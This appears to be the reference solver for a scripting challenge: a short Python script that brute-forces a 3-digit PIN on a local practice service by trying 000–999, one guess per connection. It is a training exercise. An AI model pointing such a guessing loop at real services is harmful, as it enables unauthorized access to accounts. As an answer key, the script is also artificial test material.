"""
Solver for the scripting challenge (author's reference solution).

Brute-forces the 3-digit PIN of pin_service.py - one guess per
connection, exactly like a real online brute-force against a
rate-unlimited service.

Run:  python pin_service.py &   then   python solver.py
"""

import socket

HOST, PORT = "127.0.0.1", 31337


def try_pin(pin: str) -> str:
    with socket.create_connection((HOST, PORT), timeout=3) as s:
        s.recv(64)  # banner
        s.sendall(pin.encode() + b"\n")
        return s.recv(128).decode(errors="ignore").strip()


if __name__ == "__main__":
    for i in range(1000):
        pin = f"{i:03d}"
        resp = try_pin(pin)
        if "CORRECT" in resp:
            print(f"[+] PIN found: {pin}")
            print(f"[+] {resp}")
            break
        if i % 100 == 0:
            print(f"    tried {i:03d}...")
    else:
        print("[-] PIN not found in 000-999")
